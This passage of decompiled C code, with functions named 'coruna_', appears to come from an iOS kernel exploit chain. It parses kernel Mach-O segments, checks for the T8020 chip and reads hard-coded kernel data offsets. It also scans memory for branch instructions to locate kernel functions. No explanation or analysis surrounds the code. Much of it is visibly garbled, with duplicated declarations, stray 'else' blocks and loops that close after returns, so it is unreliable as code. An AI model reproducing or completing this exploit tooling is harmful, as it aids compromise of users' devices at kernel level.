              coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),scratch,8);
            }
            coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),host_info);
          }
          coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),serial_buf);
        }
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),stack_guard);
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_kernel509_via_helper_5d2c_419fc(void)
{
  uint64_t u;
  
  u = coruna_helper_5d2c_4190c();
  coruna_helper_5d2c_419fc(u,0);
  return;
}
void coruna_fn_ptr_cast_2(void)
{
  return;
}
void coruna_kernel5_residual_225(long handle,unsigned long arg)
{
  unsigned long u;
  long handle;
  unsigned long size;
  long *ptr;
  
  if ((0xffffffffeffe < arg + 0x1000000000000) &&
     (size = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle), *(uint *)(&k_kernel_slot_18a0 + handle) != 0)) {
    ptr = (long *)(&k_kernel_slot_1a18 + handle);
    do {
      u = ptr[-1];
      handle = *ptr;
      if ((((u != 0 && handle != 0) && u <= arg) && arg <= handle + u) &&
          (((u == 0 || handle == 0) || arg < u) || handle + u != arg)) {
        return;
      }
      ptr = ptr + 3;
      size = size - 1;
    } while (size != 0);
  }
  return;
}
void coruna_kernel5_residual_226(long *handle)
{
  long *ptr;
  long handle;
  unsigned long u;
  unsigned long *ptr;
  
  ptr = (long *)*handle;
  handle = *ptr + (unsigned long)*(uint *)(ptr + 0x19) * 0x38;
  if ((*(unsigned long *)(handle + 0x28) <= (unsigned long)(handle[1] - *(long *)(handle + 0x20))) &&
     (*(uint *)(ptr + 1) != 0)) {
    u = 0;
    ptr = (unsigned long *)(*ptr + 0x28);
    do {
      if (handle[1] - ptr[-1] < *ptr) {
        *(int *)(ptr + 0x19) = (int)u;
        return;
      }
      u = u + 1;
      ptr = ptr + 7;
    } while (*(uint *)(ptr + 1) != u);
  }
  return;
}
void coruna_fn_ptr_cast_3(void)
{
  return;
}
void coruna_vm_allocate(long handle)
{
  size_t ls1;
  kern_return_t lk2;
  unsigned long u;
  vm_address_t scratch;
  
  if ((((*(char *)(handle + 0x101) == '\0') && (*(byte **)(handle + 0x108) != (byte *)0x0)) &&
      (scratch = *(vm_address_t *)(handle + 0xb0), scratch != 0)) &&
     (((*(vm_size_t *)(handle + 0xb8) != 0 && ((**(byte **)(handle + 0x108) >> 1 & 1) != 0)) &&
      (lk2 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                            *(vm_size_t *)(handle + 0xb8),0x4000), lk2 == 0)))) {
    u = (unsigned long)*(int *)(handle + 0x38);
    ls1 = 0;
    if (u != 0) {
      ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
    }
    _bzero(*(void **)(handle + 0x108),ls1);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_5(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint size)
{
  int err;
  uint u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  long handle;
  unsigned long tag;
  unsigned long kind;
  
  handle = handle;
  if (*(char *)(handle + 0x101) != '\0') {
    handle = *(long *)(handle + 0xa8);
  }
  tag = *(unsigned long *)(handle + 0xb0);
  if ((tag <= arg) && (arg + arg <= *(long *)(handle + 0xb8) + tag)) {
    version = (unsigned long)-*(int *)(handle + 0x38);
    port = version & arg;
    version = ((long)*(int *)(handle + 0x38) + arg + arg) - 1 & version;
    if (port < version) {
      kind = (unsigned long)*(int *)(handle + 0x38);
      do {
        size = 0;
        if (kind != 0) {
          size = (port - tag) / kind;
        }
        if (((*(byte *)(*(long *)(handle + 0x108) + size) & 1) == 0) || ((size & 1) != 0)) {
          err = coruna_kernel5_residual_254(*(uint64_t *)(handle + 0x118));
          if (((err != 0) &&
              (((err = coruna_uuid_is_null(*(uint64_t *)(handle + 0x118)), err != 0 &&
                (u = coruna_fn_ptr_cast_5(*(uint64_t *)(handle + 0x118)),
                *(uint *)(handle + 0x38) < u)) &&
               (size = coruna_fn_ptr_cast_5(*(uint64_t *)(handle + 0x118)),
               version - port < (size & 0xffffffff))))) && (arg < val)) {
            version = ((long)*(int *)(handle + 0x38) + arg + val) - 1 &
                    (long)-*(int *)(handle + 0x38);
            size = coruna_fn_ptr_cast_5(*(uint64_t *)(handle + 0x118));
            if (port + (size & 0xffffffff) < version) {
              version = coruna_fn_ptr_cast_5(*(uint64_t *)(handle + 0x118));
              version = port + (version & 0xffffffff);
            }
          }
          err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(*(uint64_t *)(handle + 0x118),
                               (*(long *)(handle + 0xe0) - tag) + port,version - port,port);
          if (err == 0) {
            return;
          }
          if (port < version) {
            do {
              size = 0;
              if (kind != 0) {
                size = (port - tag) / kind;
              }
              *(byte *)(*(long *)(handle + 0x108) + size) =
                   *(byte *)(*(long *)(handle + 0x108) + size) | 1;
              port = port + kind;
            } while (port < version);
          }
          **(byte **)(handle + 0x108) = **(byte **)(handle + 0x108) | 2;
          return;
        }
        port = port + kind;
      } while (port < version);
    }
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8(void)
{
  coruna_kernel509_via_fn_ptr_cast_5();
  return;
}
void coruna_kernel509_via_kernel5_residual_226(uint64_t val,uint64_t id_2)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 4;
  scratch = val;
  scratch = id_2;
  handle = coruna_kernel5_residual_226(&scratch,1);
  if (handle != 0) {
    coruna_kernel509_via_fn_ptr_cast_5(val,handle,4,0,0);
  }
  return;
}
void coruna_helper_127b4_1b298(uint64_t val,uint64_t id_2)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 8;
  scratch = val;
  scratch = id_2;
  handle = coruna_kernel5_residual_226(&scratch,1);
  if (handle != 0) {
    coruna_kernel509_via_fn_ptr_cast_5(val,handle,8,0,0);
  }
  return;
}
void coruna_helper_127b4_1b298_stub(void)
{
  coruna_helper_127b4_1b298();
  return;
}
void coruna_macho_find_loadcmd(long *handle,long addr_2,char *path)
{
  int *err;
  int *status;
  int err;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  while( true ) {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if ((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0))
    break;
  }
  *handle = addr_2;
  handle = *(long *)(err + 6);
  handle[2] = *(long *)(err + 8);
  handle[1] = handle;
  return;
}
void coruna_macho_map_segsect(long *handle,long addr_2,char *path,char *str_2)
{
  int *err;
  int *status;
  int err;
  int *flags;
  unsigned long u;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  do {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if (((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0)) &&
       (u = (unsigned long)(uint)err[0x10], err[0x10] != 0)) {
      flags = err + 0x12;
      do {
        err = _strncmp((char *)flags,str_2,0x10);
        if (err == 0) {
          *handle = addr_2;
          handle = *(long *)(flags + 8);
          handle[2] = *(long *)(flags + 10);
          handle[1] = handle;
          return;
        }
        flags = flags + 0x14;
        u = u - 1;
      } while (u != 0);
    }
    err = (int *)((long)err + (unsigned long)(uint)err[1]);
  } while( true );
}
void coruna_macho_text_sect(long handle)
{
  coruna_macho_map_segsect(handle,*(uint64_t *)(handle + 0x110),"__text");
  return;
}
void coruna_kernel5_residual_227(long handle,char *path,unsigned long arg)
{
  int *err;
  int *status;
  size_t ls3;
  uint u;
  int err;
  uint size;
  
  err = (int *)(**(long **)(handle + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(handle + 0xd0) + 0x14));
  do {
    if (status <= err) {
      return;
    }
    if (*err == -0x7fffffcb) {
      u = err[6];
      size = err[1];
      if (0x1f < u && u < size) {
        ls3 = arg;
        if (size - u <= arg) {
          ls3 = (unsigned long)(size - u);
        }
        err = _strncmp((char *)((long)err + (unsigned long)u),path,ls3);
        if (err == 0) {
          return;
        }
      }
    }
    else {
      size = err[1];
    }
    err = (int *)((long)err + (unsigned long)size);
  } while( true );
}
void coruna_ctx_clear_12bc4(uint64_t *val,uint64_t id_2)
{
  val[0x21] = 0;
  val[0x20] = 0;
  val[0x23] = 0;
  val[0x22] = 0;
  val[0x1d] = 0;
  val[0x1c] = 0;
  val[0x1f] = 0;
  val[0x1e] = 0;
  val[0x19] = 0;
  val[0x18] = 0;
  val[0x1b] = 0;
  val[0x1a] = 0;
  val[0x15] = 0;
  val[0x14] = 0;
  val[0x17] = 0;
  val[0x16] = 0;
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[0x23] = id_2;
  val[0x24] = 0;
  return;
}
void coruna_vm_deallocate_12c18(long handle)
{
  kern_return_t lk1;
  vm_address_t address;
  
  address = *(vm_address_t *)(handle + 0xb0);
  if (((address != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) &&
     (lk1 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,
                             *(vm_size_t *)(handle + 0xb8)), lk1 == 0)) {
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
  }
  return;
}
void coruna_vm_deallocate_12c8c(long handle)
{
  size_t ls1;
  uint8_t *ptr;
  kern_return_t lk3;
  void *ptr;
  unsigned long u;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk3 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                  *(vm_size_t *)(handle + 0xe8),(long)*(int *)(handle + 0x38) - 1,1,0,0,0,3,1,
                  in_stack_ffffffffffffffd0);
  if (lk3 == 0) {
    if ((*(vm_address_t *)(handle + 0xb0) != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
      _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0xb0),
                     *(vm_size_t *)(handle + 0xb8));
    }
    *(vm_address_t *)(handle + 0xb0) = scratch;
    *(long *)(handle + 0xb8) = *(long *)(handle + 0xe8);
    *(vm_address_t *)(handle + 0xf0) = *(long *)(handle + 0xe0) - scratch;
    u = (unsigned long)*(int *)(handle + 0x38);
    ls1 = 0;
    if (u != 0) {
      ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
    }
    ptr = _calloc(ls1,1);
    *(void **)(handle + 0x108) = ptr;
  }
  return;
}
void coruna_macho_text_seg(long handle,long addr_2)
{
  size_t ls1;
  int *err;
  int err;
  void *ptr;
  int *status;
  uint8_t u;
  unsigned long size;
  long *buf;
  long handle;
  int *flags;
  uint8_t scratch[20];
  uint bootargs;
  
  ptr = _calloc(0x48,1);
  *(void **)(handle + 0xd0) = ptr;
  if ((ptr != (void *)0x0) &&
     (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(*(uint64_t *)(handle + 0x118),addr_2,0x20,scratch), err != 0)) {
    ls1 = (unsigned long)bootargs + 0x20;
    status = _calloc(ls1,1);
    if ((status != (int *)0x0) &&
       (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(*(uint64_t *)(handle + 0x118),addr_2,ls1,status), err != 0)) {
      **(uint64_t **)(handle + 0xd0) = status;
      if (*status == -0x1120532) {
        u = 4;
      }
      else {
        if (*status != -0x1120531) {
          return;
        }
        u = 8;
      }
      *(uint8_t *)(handle + 0x34) = u;
      if (status[5] + 0x20 <= ls1) {
        err = status + 8;
        status = (int *)((long)err + (unsigned long)(uint)status[5]);
        if (err < status) {
          handle = 0;
          flags = err;
          do {
            if ((*flags == 0x19) && (err = _strcmp((char *)(flags + 2),"__TEXT"), err == 0))
            {
              handle = addr_2 - *(long *)(flags + 6);
            }
            flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
          } while (flags < status);
          if (handle != 0) {
            for (; err < status; err = (int *)((long)err + (unsigned long)(uint)err[1])) {
              if (*err == 0x19) {
                size = (unsigned long)(uint)err[0x10];
                if (err[0x10] != 0) {
                  buf = (long *)(err + 0x1a);
                  do {
                    *buf = *buf + handle;
                    size = size - 1;
                    buf = buf + 10;
                  } while (size != 0);
                }
                *(long *)(err + 6) = *(long *)(err + 6) + handle;
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_call_return_zero_61a8(void)
{
  coruna_find_text_exec();
  return;
}
void coruna_find_text_exec(long *handle,uint32_t size,unsigned long arg,uint64_t val)
{
  uint8_t (*lpau1) [16];
  int *err;
  int *status;
  uint u;
  bool err;
  int err;
  long *ptr;
  uint size;
  unsigned long version;
  unsigned long port;
  int *flags;
  uint tag;
  uint kind;
  long handle;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  long addr;
  uint8_t version[16];
  uint8_t scratch[16];
  long bootargs;
  
  err = coruna_macho_text_seg(handle,arg);
  if (err != 0) {
    *(uint32_t *)(handle + 0x1b) = size;
    *(uint8_t *)(handle + 0x20) = 1;
    handle = *(long *)handle[0x1a];
    flags = (int *)(handle + 0x20);
    kind = *(uint *)(handle + 0x14);
    status = (int *)((long)flags + (unsigned long)kind);
    if ((flags < status && (int *)(handle + 0x28U) <= status) && flags <= status + -2) {
      size = 0;
      while( true ) {
        u = flags[1];
        if ((u < 8) || ((unsigned long)((long)status - (long)flags) < (unsigned long)u)) break;
        err = *flags;
        tag = 0x18;
        if (err < 0xb) {
          if (err != -0x7fffffe1) {
            tag = 0x30;
            }
            else {
            flags = (int *)((long)flags + (unsigned long)u);
            if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
            flags = (int *)((long)flags + (unsigned long)u);
            if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
          }
cleanup:
          if (u < tag) break;
        }
        else {
          if (0x18 < err) {
            if (err == 0x22) {
fail:
              tag = 0x30;
            }
            else {
              flags = (int *)((long)flags + (unsigned long)u);
              if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
              size = size + 1;
              tag = 0x48;
            }
            if (u < tag) break;
          }
          if (err == 0xb) {
            tag = 0x50;
            if (u < tag) break;
          }
          if (u < tag) break;
        }
done:
        flags = (int *)((long)flags + (unsigned long)u);
        if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
      }
      if (size != 0) {
        *(uint *)(handle + 1) = size;
        ptr = _malloc((unsigned long)size * 0x38);
        *handle = (long)ptr;
        if (ptr != (long *)0x0) {
          handle[0x22] = (long)"__TEXT";
          flags = (int *)(handle + 0x20);
          status = (int *)((long)flags + (unsigned long)kind);
          if (flags < status) {
            do {
              if (*flags == 0x19) {
                if (((unsigned long)(uint)flags[1] - 0x48) / 0x50 < (unsigned long)(uint)flags[0x10]) {
                  return;
                }
                err = _strcmp((char *)(flags + 2),"__TEXT_EXEC");
                if (err == 0) {
                  handle[0x22] = (long)"__TEXT_EXEC";
                }
                addr = *(long *)(flags + 0xc);
                handle = *(long *)(flags + 10);
                *ptr = (long)handle;
                ptr[2] = addr;
                ptr[1] = handle;
                addr = *(long *)(flags + 8);
                handle = *(long *)(flags + 6);
                ptr[3] = (long)handle;
                ptr[5] = addr;
                ptr[4] = handle;
                ptr[6] = (long)flags;
                ptr = ptr + 7;
              }
              flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
            } while (flags < status);
            handle = *(long *)handle[0x1a];
          }
          addr = NEON_rev64(*(uint64_t *)(handle + 4),4);
          handle[5] = addr;
          *(uint32_t *)(handle + 6) = *(uint32_t *)(handle + 0x18);
          kind = (uint)val;
          if ((kind >> 8 & 1) != 0) {
            coruna_macho_map_segsect(scratch,handle,"__TEXT","__thread_starts");
            if (bootargs != 0) {
              *(uint8_t *)((long)handle + 0x9c) = 1;
            }
            if ((((kind >> 10 & 1) != 0) && (*handle != 0)) &&
               (handle = *(long *)(*handle + 8), handle != 0)) {
              handle[0x14] = arg - handle;
            }
          }
          if ((kind >> 6 & 1) == 0) {
            flags = (int *)(*(long *)handle[0x1a] + 0x20);
            status = (int *)((long)flags + (unsigned long)*(uint *)(*(long *)handle[0x1a] + 0x14));
            if (flags < status) {
              type_id = 0;
              err = false;
              version = (long)(int)handle[7] - 1;
              type_id_9 = arg;
              do {
                port = type_id_9;
                if (*flags == 0x19) {
                  err = flags + 2;
                  err = _strcmp((char *)err,"__TEXT");
                  if (err == 0) {
                    handle[0x1f] = arg - *(long *)(flags + 6);
                  }
                  if (((kind >> 8 & 1) != 0) &&
                     (err = _strcmp((char *)err,"__KLD"), err == 0)) {
                    err = true;
                  }
                  type_id_8 = type_id;
                  if ((((kind & 0x580) != 0x180) && (*(long *)(flags + 8) != 0)) &&
                     (type_id_8 = *(long *)(flags + 6) + *(long *)(flags + 8), type_id_8 <= type_id)) {
                    type_id_8 = type_id;
                  }
                  if ((((kind >> 10 & 1) != 0) && (*(long *)(flags + 8) != 0)) &&
                     (port = *(unsigned long *)(flags + 6), type_id_9 <= port || port == 0)) {
                    port = type_id_9;
                  }
                  err = _strcmp((char *)err,"__LINKEDIT");
                  type_id = type_id_8;
                  if (err == 0) {
                    lpau1 = (uint8_t (*) [16])(flags + 8);
                    version = NEON_ext(*lpau1,*lpau1,8,1);
                    type_id = *(long *)*lpau1 + *(long *)(flags + 6);
                    if ((kind & 0x580) != 0x180) {
                      type_id = type_id_8;
                    }
                    handle[2] = *(long *)(flags + 6);
                    handle[4] = version;
                    handle[3] = version;
                  }
                }
                flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
                type_id_9 = port;
              } while (flags < status);
              if ((((uint)!err & kind >> 8) == 0) && (type_id != 0)) {
                if ((((kind ^ 0xffffffff) & 0x500) == 0) && (handle[0x14] != 0)) {
                  port = handle[0x14];
                }
                if (port != arg) {
                  arg = port & (version ^ 0xffffffffffffffff);
                }
                type_id = type_id + version & (version ^ 0xffffffffffffffff);
                if (arg <= type_id) {
                  handle[0x1c] = arg;
                  handle[0x1d] = type_id - arg;
                  coruna_vm_deallocate_12c8c(handle,val);
                }
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_call_find_text_exec(void)
{
  coruna_find_text_exec();
  return;
}
void coruna_kernel5_via_vm_deallocate_12c18(uint64_t *val)
{
  uint64_t *ptr;
  
  coruna_vm_deallocate_12c18();
  ptr = (uint64_t *)val[0x1a];
  if (ptr != (uint64_t *)0x0) {
    if ((void *)*ptr != (void *)0x0) {
      _free((void *)*ptr);
      ptr = (uint64_t *)val[0x1a];
      *ptr = 0;
    }
    _free(ptr);
    val[0x1a] = 0;
  }
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
    *val = 0;
  }
  if ((void *)val[0x21] != (void *)0x0) {
    _free((void *)val[0x21]);
    val[0x21] = 0;
  }
  return;
}
void coruna_kernel509_str_t8020(uint64_t *val,uint64_t *id_2,long handle)
{
  int err;
  char *ptr;
  uint64_t u;
  uint64_t size;
  long handle;
  long addr;
  long off;
  unsigned long version;
  unsigned long port;
  uint64_t tag;
  int status;
  uint64_t scratch;
  uint64_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint32_t host_info;
  long serial_buf;
  
  version = k_kernel_rodata_word_480e0;
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = _strstr(k_kernel_rodata_word_480d8,"T8020");
  size = k_kernel_rodata_word_000433c8;
  tag = k_kernel_rodata_word_433c0;
  u = k_kernel_rodata_word_433b0;
  if (ptr == (char *)0x0) {
    val[1] = k_kernel_rodata_word_000433b8;
    *val = u;
    val[3] = size;
    val[2] = tag;
    val[4] = k_kernel_rodata_word_43450;
    *(uint32_t *)(val + 5) = 0x2bcb05c8;
    thread_attr = k_kernel_rodata_word_43458;
    scratch = 0xffffffffffffffff;
    u = coruna_ret_stub_4(id_2,&thread_attr,&scratch,2);
    val[6] = u;
    tag = k_kernel_rodata_word_000433e8;
    u = k_kernel_rodata_word_433e0;
    bootargs = k_kernel_rodata_word_000433d8;
    thread_attr = k_kernel_rodata_word_433d0;
    scratch = k_kernel_rodata_word_000433e8;
    scratch = k_kernel_rodata_word_433e0;
    size = coruna_ret_stub_4(id_2,&thread_attr,&scratch,4);
    val[7] = size;
    bootargs = k_kernel_rodata_word_000433f8;
    thread_attr = k_kernel_rodata_word_433f0;
    scratch = tag;
    scratch = u;
    u = coruna_ret_stub_4(id_2,&thread_attr,&scratch,4);
    val[8] = u;
    thread_attr = k_kernel_rodata_word_43460;
    scratch = 0xffffffffffffffff;
    u = coruna_ret_stub_4(id_2,&thread_attr,&scratch,2);
    val[9] = u;
    if (version < 0x918c5a83400) {
      status = -0x56fcfd81;
      thread_attr = k_kernel_rodata_word_43468;
      scratch = 0xffffffffffffffff;
      u = coruna_ret_stub_4(id_2,&thread_attr,&scratch,2);
    }
    else {
      thread_attr = k_kernel_rodata_word_43470;
      scratch = 0xffffffffffffffff;
      u = coruna_ret_stub_4(id_2,&thread_attr,&scratch,2);
      status = -0x56fcfd21;
    }
    val[10] = u;
    thread_attr = k_kernel_rodata_word_43478;
    bootargs = coruna_u64_pack((bootargs), (0x72a003a2));
    scratch = 0xffffffffffffffff;
    scratch = coruna_u64_pack((scratch), (0xffffffff));
    u = coruna_ret_stub_4(id_2,&thread_attr,&scratch,3);
    val[0xb] = u;
    thread_attr = k_kernel_rodata_word_43480;
    scratch = 0xff000000ffffffff;
    handle = coruna_ret_stub_4(id_2,&thread_attr,&scratch,2);
    val[0xc] = handle + 8;
    bootargs = k_kernel_rodata_word_00043408;
    thread_attr = k_kernel_rodata_word_43400;
    scratch = 0xffffffffffffffff;
    scratch = 0xffffffffffffffff;
    u = coruna_ret_stub_4(id_2,&thread_attr,&scratch,4);
    val[0xd] = u;
    bootargs = k_kernel_rodata_word_00043418;
    thread_attr = k_kernel_rodata_word_43410;
    scratch = 0xffffffffffffffff;
    scratch = 0xffffffffffffffff;
    handle = coruna_ret_stub_5(id_2,&thread_attr,&scratch,4);
    val[0xf] = handle + -8;
    tag = *(uint64_t *)(handle + 0x20);
    u = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(handle,handle + 0x10);
    addr = coruna_kernel509_via_fn_ptr_cast_10_10(tag,u);
    handle = 0;
    do {
      off = coruna_fn_ptr_cast_12(id_2,*id_2,addr + handle);
      err = coruna_fn_ptr_cast_12(id_2,*id_2,addr + handle + 8);
      if (((uint)off & 0xfc000000) == 0x94000000 && err == status) {
        val[0xe] = addr + ((off << 0x26) >> 0x24) + handle;
        break;
      }
      handle = handle + 4;
    } while ((int)handle != 0x1000);
    tag = *(uint64_t *)(handle + 0x20);
    u = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(handle,val[0xf] + 0x18);
    addr = coruna_kernel509_via_fn_ptr_cast_10_10(tag,u);
    handle = 0;
    do {
      off = coruna_fn_ptr_cast_12(id_2,*id_2,addr + handle);
      if ((((uint)off & 0xfc000000) == 0x94000000) &&
         (addr + handle + ((off << 0x26) >> 0x24) == val[0xe])) {
        addr = addr + handle;
        handle = 0;
        status = -0x6ffe940;
        if (version < 0x918c5a83400) {
        status = -0x6ffe9a0;
        }
        do {
        off = addr + handle;
        err = coruna_fn_ptr_cast_12(id_2,*id_2,off);
        version = coruna_fn_ptr_cast_12(id_2,*id_2,off + 4U);
        port = coruna_fn_ptr_cast_12(id_2,*id_2,off + 8);
        val[0x10] =
        (off + 4U & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        bootargs = k_kernel_rodata_word_00043498;
        thread_attr = k_kernel_rodata_word_43490;
        host_info = k_kernel_rodata_word_434a0;
        scratch = k_kernel_rodata_word_000434ac;
        scratch = k_kernel_rodata_word_434a4;
        bootargs = k_kernel_rodata_word_434b4;
        handle = coruna_ret_stub_4(id_2,&thread_attr,&scratch,5);
        val[0x11] = handle;
        version = coruna_fn_ptr_cast_12(id_2,*id_2,handle + 4);
        port = coruna_fn_ptr_cast_12(id_2,*id_2,val[0x11] + 8);
        u = 0;
        val[0x11] =
        (val[0x11] + 4 & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        }
        else {
        u = 5;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
        return;
        } while ((int)handle != -0x80);
        off = 0;
        version = coruna_fn_ptr_cast_12(id_2,*id_2,off + 4U);
        port = coruna_fn_ptr_cast_12(id_2,*id_2,off + 8);
        val[0x10] =
        (off + 4U & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        bootargs = k_kernel_rodata_word_00043498;
        thread_attr = k_kernel_rodata_word_43490;
        host_info = k_kernel_rodata_word_434a0;
        scratch = k_kernel_rodata_word_000434ac;
        scratch = k_kernel_rodata_word_434a4;
        bootargs = k_kernel_rodata_word_434b4;
        handle = coruna_ret_stub_4(id_2,&thread_attr,&scratch,5);
        val[0x11] = handle;
        version = coruna_fn_ptr_cast_12(id_2,*id_2,handle + 4);
        port = coruna_fn_ptr_cast_12(id_2,*id_2,val[0x11] + 8);
        u = 0;
        val[0x11] =
        (val[0x11] + 4 & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        }
        else {
        u = 5;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
        return;
      }
      handle = handle + 4;
    } while ((int)handle != 0x300);
    addr = 0;
fail:
    handle = 0;
    status = -0x6ffe940;
    if (version < 0x918c5a83400) {
      status = -0x6ffe9a0;
    }
    do {
      off = addr + handle;
      err = coruna_fn_ptr_cast_12(id_2,*id_2,off);
      version = coruna_fn_ptr_cast_12(id_2,*id_2,off + 4U);
      port = coruna_fn_ptr_cast_12(id_2,*id_2,off + 8);
      val[0x10] =
      (off + 4U & 0xfffffffffffff000) +
      (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
      (unsigned long)((uint)(port >> 7) & 0x7ff8);
      bootargs = k_kernel_rodata_word_00043498;
      thread_attr = k_kernel_rodata_word_43490;
      host_info = k_kernel_rodata_word_434a0;
      scratch = k_kernel_rodata_word_000434ac;
      scratch = k_kernel_rodata_word_434a4;
      bootargs = k_kernel_rodata_word_434b4;
      handle = coruna_ret_stub_4(id_2,&thread_attr,&scratch,5);
      val[0x11] = handle;
      version = coruna_fn_ptr_cast_12(id_2,*id_2,handle + 4);
      port = coruna_fn_ptr_cast_12(id_2,*id_2,val[0x11] + 8);
      u = 0;
      val[0x11] =
      (val[0x11] + 4 & 0xfffffffffffff000) +
      (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
      (unsigned long)((uint)(port >> 7) & 0x7ff8);
      }
      else {
      u = 5;
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
      return;
    } while ((int)handle != -0x80);
    off = 0;
done:
    version = coruna_fn_ptr_cast_12(id_2,*id_2,off + 4U);
    port = coruna_fn_ptr_cast_12(id_2,*id_2,off + 8);
    val[0x10] =
         (off + 4U & 0xfffffffffffff000) +
         (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
         (unsigned long)((uint)(port >> 7) & 0x7ff8);
    bootargs = k_kernel_rodata_word_00043498;
    thread_attr = k_kernel_rodata_word_43490;
    host_info = k_kernel_rodata_word_434a0;
    scratch = k_kernel_rodata_word_000434ac;
    scratch = k_kernel_rodata_word_434a4;
    bootargs = k_kernel_rodata_word_434b4;
    handle = coruna_ret_stub_4(id_2,&thread_attr,&scratch,5);
    val[0x11] = handle;
    version = coruna_fn_ptr_cast_12(id_2,*id_2,handle + 4);
    port = coruna_fn_ptr_cast_12(id_2,*id_2,val[0x11] + 8);
    u = 0;
    val[0x11] =
         (val[0x11] + 4 & 0xfffffffffffff000) +
         (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
         (unsigned long)((uint)(port >> 7) & 0x7ff8);
  }
  else {
    u = 5;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_thread_switch_1c404(long handle)
{
  int err;
  unsigned long u;
  
  err = *(int *)(handle + 0x14);
  while (err != 0) {
    u = tpidr_el0;
